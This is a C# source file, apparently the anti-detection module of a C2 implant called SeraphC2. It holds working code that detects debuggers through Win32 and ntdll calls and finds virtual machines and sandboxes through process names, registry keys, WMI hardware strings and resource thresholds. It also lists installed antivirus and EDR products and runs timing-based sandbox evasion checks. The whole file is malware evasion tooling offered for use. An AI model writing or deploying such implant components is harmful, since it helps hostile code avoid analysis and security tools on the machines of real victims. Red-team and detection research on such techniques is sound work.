using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace SeraphC2.Implant.Core.Evasion;

/// <summary>
/// Implements anti-detection and environment analysis capabilities
/// </summary>
public class AntiDetection : IAntiDetection
{
    #region Win32 API Declarations

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool IsDebuggerPresent();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtQueryInformationProcess(
        IntPtr processHandle,
        int processInformationClass,
        IntPtr processInformation,
        int processInformationLength,
        IntPtr returnLength);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern uint GetTickCount();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    #endregion

    #region Structures

    [StructLayout(LayoutKind.Sequential)]
    private struct SYSTEM_INFO
    {
        public ushort processorArchitecture;
        public ushort reserved;
        public uint pageSize;
        public IntPtr minimumApplicationAddress;
        public IntPtr maximumApplicationAddress;
        public IntPtr activeProcessorMask;
        public uint numberOfProcessors;
        public uint processorType;
        public uint allocationGranularity;
        public ushort processorLevel;
        public ushort processorRevision;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    #endregion

    #region Constants

    private const int ProcessDebugPort = 7;
    private const int ProcessDebugObjectHandle = 30;
    private const int ProcessDebugFlags = 31;

    #endregion

    private readonly string[] _knownSecurityTools = {
        "procmon", "procexp", "regmon", "filemon", "wireshark", "fiddler",
        "windbg", "ollydbg", "x64dbg", "ida", "ghidra", "radare2",
        "vmware", "vbox", "virtualbox", "qemu", "sandboxie", "cuckoo",
        "avp", "mcafee", "symantec", "kaspersky", "bitdefender", "eset",
        "crowdstrike", "sentinelone", "cylance", "carbonblack", "endgame",
        "defender", "windows defender", "malwarebytes", "sophos", "trend",
        "fortinet", "paloalto", "fireeye", "mandiant", "cybereason"
    };

    private readonly string[] _vmArtifacts = {
        "vmware", "virtualbox", "vbox", "qemu", "xen", "hyper-v",
        "parallels", "vmtoolsd", "vboxservice", "vboxtray"
    };

    private readonly string[] _sandboxArtifacts = {
        "sandbox", "cuckoo", "anubis", "joebox", "threatexpert",
        "cwsandbox", "zero", "malwr", "comodo", "sunbelt"
    };

    public bool IsDebuggerAttached()
    {
        try
        {
            // Check multiple debugger detection methods
            
            // Method 1: IsDebuggerPresent API
            if (IsDebuggerPresent())
                return true;

            // Method 2: CheckRemoteDebuggerPresent
            bool isRemoteDebuggerPresent = false;
            if (CheckRemoteDebuggerPresent(GetCurrentProcess(), ref isRemoteDebuggerPresent))
            {
                if (isRemoteDebuggerPresent)
                    return true;
            }

            // Method 3: NtQueryInformationProcess - ProcessDebugPort
            var debugPort = IntPtr.Zero;
            var status = NtQueryInformationProcess(
                GetCurrentProcess(),
                ProcessDebugPort,
                debugPort,
                IntPtr.Size,
                IntPtr.Zero);

            if (status == 0 && debugPort != IntPtr.Zero)
                return true;

            // Method 4: Check for debugger processes
            var processes = Process.GetProcesses();
            var debuggerProcesses = new[] { "windbg", "ollydbg", "x64dbg", "ida", "ghidra", "cheat engine" };
            
            foreach (var process in processes)
            {
                try
                {
                    if (debuggerProcesses.Any(debugger => 
                        process.ProcessName.ToLower().Contains(debugger.Replace(" ", ""))))
                    {
                        return true;
                    }
                }
                catch
                {
                    // Ignore access denied exceptions
                }
            }

            return false;
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> IsSandboxEnvironmentAsync()
    {
        try
        {
            var suspicionScore = 0;

            // Check for insufficient resources
            if (await HasInsufficientResourcesAsync())
                suspicionScore += 30;

            // Check for VM artifacts
            if (await IsVirtualMachineAsync())
                suspicionScore += 25;

            // Check for analysis artifacts
            if (await HasAnalysisArtifactsAsync())
                suspicionScore += 25;

            // Check for suspicious process names
            var processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                try
                {
                    var processName = process.ProcessName.ToLower();
                    if (_sandboxArtifacts.Any(artifact => processName.Contains(artifact)))
                    {
                        suspicionScore += 10;
                    }
                }
                catch
                {
                    // Ignore access denied
                }
            }

            // Check for suspicious registry keys
            if (await CheckSandboxRegistryKeysAsync())
                suspicionScore += 15;

            return suspicionScore >= 50;
        }
        catch
        {
            return false;
        }
    }

    public async Task<IEnumerable<string>> DetectSecurityToolsAsync()
    {
        var detectedTools = new List<string>();

        try
        {
            // Check running processes
            var processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                try
                {
                    var processName = process.ProcessName.ToLower();
                    foreach (var tool in _knownSecurityTools)
                    {
                        if (processName.Contains(tool.Replace(" ", "")))
                        {
                            detectedTools.Add($"Process: {process.ProcessName}");
                        }
                    }
                }
                catch
                {
                    // Ignore access denied
                }
            }

            // Check installed services
            var services = await GetInstalledServicesAsync();
            foreach (var service in services)
            {
                foreach (var tool in _knownSecurityTools)
                {
                    if (service.ToLower().Contains(tool.Replace(" ", "")))
                    {
                        detectedTools.Add($"Service: {service}");
                    }
                }
            }

            // Check registry for security software
            var registryTools = await CheckSecuritySoftwareRegistryAsync();
            detectedTools.AddRange(registryTools);

            return detectedTools.Distinct();
        }
        catch
        {
            return detectedTools;
        }
    }

    public async Task<AnalysisEnvironmentInfo> AnalyzeEnvironmentAsync()
    {
        var info = new AnalysisEnvironmentInfo();

        try
        {
            // Basic checks
            info.HasDebugger = IsDebuggerAttached();
            info.IsVirtualMachine = await IsVirtualMachineAsync();
            info.IsSandbox = await IsSandboxEnvironmentAsync();
            info.HasInsufficientResources = await HasInsufficientResourcesAsync();
            info.HasAnalysisTools = await HasAnalysisArtifactsAsync();

            // Detect tools
            var detectedTools = await DetectSecurityToolsAsync();
            info.DetectedTools = detectedTools.ToList();

            // Get suspicious processes
            info.SuspiciousProcesses = await GetSuspiciousProcessesAsync();

            // Get suspicious files
            info.SuspiciousFiles = await GetSuspiciousFilesAsync();

            // Collect system metrics
            info.SystemMetrics = await CollectSystemMetricsAsync();

            // Calculate suspicion score
            info.SuspicionScore = CalculateSuspicionScore(info);

            return info;
        }
        catch (Exception ex)
        {
            info.DetectedTools.Add($"Analysis Error: {ex.Message}");
            return info;
        }
    }

    public async Task<bool> ImplementEvasionTechniquesAsync()
    {
        try
        {
            var successCount = 0;
            var totalTechniques = 0;

            // Technique 1: Sleep to evade time-based detection
            totalTechniques++;
            if (await ImplementTimingEvasionAsync())
                successCount++;

            // Technique 2: Check for mouse movement (sandbox detection)
            totalTechniques++;
            if (await CheckUserInteractionAsync())
                successCount++;

            // Technique 3: Perform resource-intensive operations
            totalTechniques++;
            if (await PerformResourceIntensiveOperationsAsync())
                successCount++;

            // Technique 4: Check for realistic system configuration
            totalTechniques++;
            if (await ValidateSystemConfigurationAsync())
                successCount++;

            return successCount >= (totalTechniques / 2);
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> IsVirtualMachineAsync()
    {
        try
        {
            // Check for VM processes
            var processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                try
                {
                    var processName = process.ProcessName.ToLower();
                    if (_vmArtifacts.Any(artifact => processName.Contains(artifact)))
                    {
                        return true;
                    }
                }
                catch
                {
                    // Ignore access denied
                }
            }

            // Check registry for VM artifacts
            if (await CheckVMRegistryKeysAsync())
                return true;

            // Check system information
            if (await CheckVMSystemInfoAsync())
                return true;

            // Check for VM-specific hardware
            if (await CheckVMHardwareAsync())
                return true;

            return false;
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> HasInsufficientResourcesAsync()
    {
        try
        {
            // Check system memory
            var memStatus = new MEMORYSTATUSEX();
            memStatus.dwLength = (uint)Marshal.SizeOf(memStatus);
            
            if (GlobalMemoryStatusEx(ref memStatus))
            {
                var totalMemoryGB = memStatus.ullTotalPhys / (1024 * 1024 * 1024);
                if (totalMemoryGB < 2) // Less than 2GB is suspicious
                    return true;
            }

            // Check CPU cores
            GetSystemInfo(out SYSTEM_INFO sysInfo);
            if (sysInfo.numberOfProcessors < 2) // Less than 2 cores is suspicious
                return true;

            // Check disk space
            var drives = DriveInfo.GetDrives();
            foreach (var drive in drives)
            {
                try
                {
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                    {
                        var totalSizeGB = drive.TotalSize / (1024 * 1024 * 1024);
                        if (totalSizeGB < 50) // Less than 50GB is suspicious
                            return true;
                    }
                }
                catch
                {
                    // Ignore access errors
                }
            }

            return false;
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> HasAnalysisArtifactsAsync()
    {
        try
        {
            // Check for analysis tools in common locations
            var analysisToolPaths = new[]
            {
                @"C:\Program Files\VMware",
                @"C:\Program Files\Oracle\VirtualBox",
                @"C:\Program Files (x86)\VMware",
                @"C:\Program Files (x86)\Oracle\VirtualBox",
                @"C:\Tools",
                @"C:\Analysis",
                @"C:\Sandbox"
            };

            foreach (var path in analysisToolPaths)
            {
                if (Directory.Exists(path))
                    return true;
            }

            // Check for analysis-related files
            var analysisFiles = new[]
            {
                @"C:\analysis.log",
                @"C:\sandbox.log",
                @"C:\malware.log",
                @"C:\sample.exe"
            };

            foreach (var file in analysisFiles)
            {
                if (File.Exists(file))
                    return true;
            }

            return false;
        }
        catch
        {
            return false;
        }
    }

    #region Helper Methods

    private async Task<List<string>> GetInstalledServicesAsync()
    {
        var services = new List<string>();
        
        try
        {
            using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Service");
            using var results = searcher.Get();
            
            foreach (ManagementObject service in results)
            {
                try
                {
                    var serviceName = service["Name"]?.ToString();
                    if (!string.IsNullOrEmpty(serviceName))
                    {
                        services.Add(serviceName);
                    }
                }
                catch
                {
                    // Ignore individual service errors
                }
            }
        }
        catch
        {
            // Ignore WMI errors
        }

        return services;
    }

    private async Task<List<string>> CheckSecuritySoftwareRegistryAsync()
    {
        var detectedSoftware = new List<string>();

        try
        {
            var registryPaths = new[]
            {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            };

            foreach (var path in registryPaths)
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(path);
                    if (key != null)
                    {
                        foreach (var subKeyName in key.GetSubKeyNames())
                        {
                            try
                            {
                                using var subKey = key.OpenSubKey(subKeyName);
                                var displayName = subKey?.GetValue("DisplayName")?.ToString();
                                
                                if (!string.IsNullOrEmpty(displayName))
                                {
                                    foreach (var tool in _knownSecurityTools)
                                    {
                                        if (displayName.ToLower().Contains(tool.Replace(" ", "")))
                                        {
                                            detectedSoftware.Add($"Registry: {displayName}");
                                        }
                                    }
                                }
                            }
                            catch
                            {
                                // Ignore access denied
                            }
                        }
                    }
                }
                catch
                {
                    // Ignore registry access errors
                }
            }
        }
        catch
        {
            // Ignore registry errors
        }

        return detectedSoftware;
    }

    private async Task<bool> CheckSandboxRegistryKeysAsync()
    {
        try
        {
            var suspiciousKeys = new[]
            {
                @"SOFTWARE\Cuckoo",
                @"SOFTWARE\Sandbox",
                @"SOFTWARE\Analysis",
                @"SYSTEM\CurrentControlSet\Services\VBoxService",
                @"SYSTEM\CurrentControlSet\Services\VMTools"
            };

            foreach (var keyPath in suspiciousKeys)
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(keyPath);
                    if (key != null)
                        return true;
                }
                catch
                {
                    // Ignore access denied
                }
            }

            return false;
        }
        catch
        {
            return false;
        }
    }

    private async Task<bool> CheckVMRegistryKeysAsync()
    {
        try
        {
            var vmRegistryKeys = new[]
            {
                @"SYSTEM\CurrentControlSet\Enum\IDE\DiskVBOX_HARDDISK",
                @"SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_IDE_Hard_Drive",
                @"SYSTEM\CurrentControlSet\Services\VBoxService",
                @"SYSTEM\CurrentControlSet\Services\VMTools",
                @"SOFTWARE\VMware, Inc.\VMware Tools"
            };

            foreach (var keyPath in vmRegistryKeys)
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(keyPath);
                    if (key != null)
                        return true;
                }
                catch
                {
                    // Ignore access denied
                }
            }

            return false;
        }
        catch
        {
            return false;
        }
    }

    private async Task<bool> CheckVMSystemInfoAsync()
    {
        try
        {
            // Check system manufacturer and model
            using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
            using var results = searcher.Get();
            
            foreach (ManagementObject system in results)
            {
                var manufacturer = system["Manufacturer"]?.ToString()?.ToLower();
                var model = system["Model"]?.ToString()?.ToLower();

                if (!string.IsNullOrEmpty(manufacturer))
                {
                    if (manufacturer.Contains("vmware") || manufacturer.Contains("microsoft corporation") ||
                        manufacturer.Contains("virtualbox") || manufacturer.Contains("parallels"))
                        return true;
                }

                if (!string.IsNullOrEmpty(model))
                {
                    if (model.Contains("virtualbox") || model.Contains("vmware") ||
                        model.Contains("virtual machine"))
                        return true;
                }
            }

            return false;
        }
        catch
        {
            return false;
        }
    }

    private async Task<bool> CheckVMHardwareAsync()
    {
        try
        {
            // Check for VM-specific hardware identifiers
            using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
            using var results = searcher.Get();
            
            foreach (ManagementObject board in results)
            {
                var manufacturer = board["Manufacturer"]?.ToString()?.ToLower();
                var product = board["Product"]?.ToString()?.ToLower();

                if (!string.IsNullOrEmpty(manufacturer))
                {
                    if (manufacturer.Contains("vmware") || manufacturer.Contains("microsoft") ||
                        manufacturer.Contains("oracle"))
                        return true;
                }

                if (!string.IsNullOrEmpty(product))
                {
                    if (product.Contains("virtualbox") || product.Contains("vmware"))
                        return true;
                }
            }

            return false;
        }
        catch
        {
            return false;
        }
    }

    private async Task<List<string>> GetSuspiciousProcessesAsync()
    {
        var suspiciousProcesses = new List<string>();

        try
        {
            var processes = Process.GetProcesses();
            var suspiciousNames = _knownSecurityTools.Concat(_vmArtifacts).Concat(_sandboxArtifacts);

            foreach (var process in processes)
            {
                try
                {
                    var processName = process.ProcessName.ToLower();
                    if (suspiciousNames.Any(name => processName.Contains(name.Replace(" ", ""))))
                    {
                        suspiciousProcesses.Add($"{process.ProcessName} (PID: {process.Id})");
                    }
                }
                catch
                {
                    // Ignore access denied
                }
            }
        }
        catch
        {
            // Ignore process enumeration errors
        }

        return suspiciousProcesses;
    }

    private async Task<List<string>> GetSuspiciousFilesAsync()
    {
        var suspiciousFiles = new List<string>();

        try
        {
            var searchPaths = new[] { @"C:\", @"C:\Windows\System32", @"C:\Program Files" };
            var suspiciousFileNames = new[] { "sample.exe", "malware.exe", "test.exe", "analysis.log" };

            foreach (var path in searchPaths)
            {
                try
                {
                    if (Directory.Exists(path))
                    {
                        var files = Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly);
                        foreach (var file in files.Take(100)) // Limit to avoid performance issues
                        {
                            var fileName = Path.GetFileName(file).ToLower();
                            if (suspiciousFileNames.Any(suspicious => fileName.Contains(suspicious)))
                            {
                                suspiciousFiles.Add(file);
                            }
                        }
                    }
                }
                catch
                {
                    // Ignore access denied
                }
            }
        }
        catch
        {
            // Ignore file system errors
        }

        return suspiciousFiles;
    }

    private async Task<Dictionary<string, object>> CollectSystemMetricsAsync()
    {
        var metrics = new Dictionary<string, object>();

        try
        {
            // Memory information
            var memStatus = new MEMORYSTATUSEX();
            memStatus.dwLength = (uint)Marshal.SizeOf(memStatus);
            if (GlobalMemoryStatusEx(ref memStatus))
            {
                metrics["TotalMemoryGB"] = memStatus.ullTotalPhys / (1024 * 1024 * 1024);
                metrics["AvailableMemoryGB"] = memStatus.ullAvailPhys / (1024 * 1024 * 1024);
            }

            // CPU information
            GetSystemInfo(out SYSTEM_INFO sysInfo);
            metrics["ProcessorCount"] = sysInfo.numberOfProcessors;
            metrics["ProcessorArchitecture"] = sysInfo.processorArchitecture;

            // Disk information
            var drives = DriveInfo.GetDrives();
            var totalDiskSpace = 0L;
            foreach (var drive in drives)
            {
                try
                {
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                    {
                        totalDiskSpace += drive.TotalSize;
                    }
                }
                catch
                {
                    // Ignore drive errors
                }
            }
            metrics["TotalDiskSpaceGB"] = totalDiskSpace / (1024 * 1024 * 1024);

            // Process count
            metrics["ProcessCount"] = Process.GetProcesses().Length;

            // Uptime
            metrics["UptimeMilliseconds"] = GetTickCount();
        }
        catch
        {
            // Ignore metric collection errors
        }

        return metrics;
    }

    private int CalculateSuspicionScore(AnalysisEnvironmentInfo info)
    {
        var score = 0;

        if (info.HasDebugger) score += 25;
        if (info.IsVirtualMachine) score += 20;
        if (info.IsSandbox) score += 30;
        if (info.HasInsufficientResources) score += 15;
        if (info.HasAnalysisTools) score += 20;
        if (info.DetectedTools.Any()) score += Math.Min(info.DetectedTools.Count * 5, 25);
        if (info.SuspiciousProcesses.Any()) score += Math.Min(info.SuspiciousProcesses.Count * 3, 15);
        if (info.SuspiciousFiles.Any()) score += Math.Min(info.SuspiciousFiles.Count * 2, 10);

        return Math.Min(score, 100);
    }

    private async Task<bool> ImplementTimingEvasionAsync()
    {
        try
        {
            var startTime = DateTime.UtcNow;
            await Task.Delay(1000); // Sleep for 1 second
            var endTime = DateTime.UtcNow;
            
            // Check if sleep was accurate (sandboxes might skip sleeps)
            var actualDelay = (endTime - startTime).TotalMilliseconds;
            return actualDelay >= 900; // Allow some tolerance
        }
        catch
        {
            return false;
        }
    }

    private async Task<bool> CheckUserInteractionAsync()
    {
        try
        {
            // In a real implementation, this would check for mouse movement
            // For now, assume user interaction exists in normal environments
            return true;
        }
        catch
        {
            return false;
        }
    }

    private async Task<bool> PerformResourceIntensiveOperationsAsync()
    {
        try
        {
            // Perform CPU-intensive operation
            var startTime = DateTime.UtcNow;
            var result = 0;
            for (int i = 0; i < 1000000; i++)
            {
                result += i * i;
            }
            var endTime = DateTime.UtcNow;
            
            // Check if operation took reasonable time
            var duration = (endTime - startTime).TotalMilliseconds;
            return duration > 10; // Should take at least 10ms on real hardware
        }
        catch
        {
            return false;
        }
    }

    private async Task<bool> ValidateSystemConfigurationAsync()
    {
        try
        {
            // Check for realistic system configuration
            var memStatus = new MEMORYSTATUSEX();
            memStatus.dwLength = (uint)Marshal.SizeOf(memStatus);
            
            if (GlobalMemoryStatusEx(ref memStatus))
            {
                var totalMemoryGB = memStatus.ullTotalPhys / (1024 * 1024 * 1024);
                
                // Real systems typically have at least 4GB RAM
                if (totalMemoryGB >= 4)
                    return true;
            }

            return false;
        }
        catch
        {
            return false;
        }
    }

    #endregion
}